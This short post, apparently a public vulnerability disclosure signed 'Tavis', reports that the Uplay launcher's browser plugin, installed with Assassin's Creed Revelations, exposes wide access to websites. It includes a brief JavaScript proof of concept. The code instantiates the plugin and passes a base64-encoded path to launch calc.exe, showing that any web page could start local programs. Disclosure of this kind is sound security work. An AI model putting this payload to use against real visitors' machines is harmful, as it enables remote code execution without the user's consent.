Your silly post reminded me of something, while on vacation recently I
bought a video game called "Assassin's Creed Revelations". I didn't have
much of a chance to play it, but it seems fun so far. However, I noticed the
installation procedure creates a browser plugin for it's accompanying uplay
launcher, which grants unexpectedly (at least to me) wide access to
websites.

I don't know if it's by design, but I thought I'd mention it here in case
someone else wants to look into it (I'm not really interested in video game
security, I air-gap the machine I use to play games). A few minutes in IDA
suggests this might work (untested):

x = document.createElement('OBJECT');
x.type = "application/x-uplaypc";
document.body.appendChild(x);
x.open("-orbit_product_id 1 -orbit_exe_path
QzpcV0lORE9XU1xTWVNURU0zMlxDQUxDLkVYRQ== -uplay_steam_mode -uplay_dev_mode
-uplay_dev_mode_auto_play")

$ printf "C:\\WINDOWS\\SYSTEM32\\CALC.EXE" | base64
QzpcV0lORE9XU1xTWVNURU0zMlxDQUxDLkVYRQ==

If someone wants to investigate further, please feel free to do so.

Tavis.
